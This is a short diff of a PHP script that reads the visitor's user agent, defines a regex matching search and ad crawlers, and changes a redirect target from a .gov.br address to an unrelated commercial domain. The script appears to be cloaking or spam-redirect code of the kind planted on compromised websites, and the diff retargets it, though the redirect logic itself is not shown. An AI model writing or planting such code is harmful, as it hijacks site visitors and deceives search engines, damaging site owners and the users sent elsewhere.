@@ -5,7 +5,7 @@
 
     $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-    $urlTo = "https://social.itudigital.sp.gov.br/v";
+    $urlTo = "https://quesoshontanar.com";
 
     $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
